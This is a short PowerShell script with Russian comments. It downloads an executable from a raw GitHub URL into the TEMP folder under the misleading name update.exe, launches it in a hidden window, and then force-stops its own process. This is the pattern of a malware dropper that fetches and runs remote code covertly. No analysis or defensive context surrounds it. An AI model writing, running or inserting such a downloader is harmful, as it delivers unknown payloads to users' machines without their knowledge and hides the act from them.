$exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
$exePath = "$env:TEMP\update.exe"

# Скачиваем
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing

# Запускаем
Start-Process -FilePath $exePath -WindowStyle Hidden

# Закрываемся
Start-Sleep -Seconds 2
Stop-Process -Id $PID -Force
